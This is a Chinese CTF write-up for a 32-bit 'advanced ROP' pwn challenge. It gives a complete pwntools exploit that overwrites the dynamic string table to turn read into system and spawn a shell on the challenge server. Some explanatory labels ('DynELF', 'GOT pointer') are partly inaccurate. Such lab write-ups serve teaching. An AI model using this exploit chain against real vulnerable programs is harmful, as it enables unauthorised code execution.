# 挑战简介
高级ROP 32 位 NO-RELRO

# 思路
估摸着也太高级了，由于没有libc文件且可能开启ASLR，无法直接获取system函数地址，因此使用DynELF技术：

- 修改程序的动态链接表，将read函数替换为system函数
- 通过ROP链实现函数替换和参数传递

**第一步：准备替换数据**
```
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b'read', b'system')
```

- 获取.dynstr段（存储函数名字符串）
- 将其中的"read"替换为"system"

**第二步：构造ROP链**
```
rop.raw(b'a' * offsets)  # 填充到返回地址
rop.read(0, 0x8049804 + 4, 4)  # 修改GOT表指针
rop.read(0, 0x80498e0, len(dynstr))  # 写入修改后的dynstr
rop.read(0, 0x80498e0 + 0x100, len("/bin/sh\x00"))  # 写入"/bin/sh"
rop.raw(0x8048376)  # 调用被替换的"read"(实际是system)
rop.raw(0xdeadbeef)  # 返回地址占位
rop.raw(0x80498e0 + 0x100)  # system的参数："/bin/sh"地址
```

第三步：关键地址分析

- 0x8049804 + 4：GOT表中read函数的地址指针
- 0x80498e0：用于存放修改后dynstr的内存地址
- 0x8048376：read函数在PLT中的地址

```
from pwn import *
#from struct import pack
from LibcSearcher import *

#context.log_level = 'debug'
#context(arch = 'amd64',os = 'linux',log_level = 'debug')
context(arch = 'i386',os = 'linux',log_level = 'debug')


#io = process('./pwn')
elf = ELF('D:\edge 下载\pwn')
rop = ROP('D:\edge 下载\pwn')
#libc = ELF('./libc.so.6')

io = remote('pwn.challenge.ctf.show',28262)

offsets = 112
dynstr =elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b'read',b'system')
rop.raw(b'a' * offsets)
rop.read(0,0x8049804 + 4,4)
rop.read(0,0x80498e0,len(dynstr))
rop.read(0,0x80498e0 + 0x100,len("/bin/sh\x00"))
rop.raw(0x8048376)
rop.raw(0xdeadbeef)
rop.raw(0x80498e0 + 0x100)
rop.raw(b'a' * (256-len(rop.chain())))

io.recvuntil('Welcome to CTFshowPWN!\n')
io.send(rop.chain())
io.send(p32(0x80498e0))
io.send(dynstr)
io.send(b'/bin/sh\x00')
io.interactive()
```
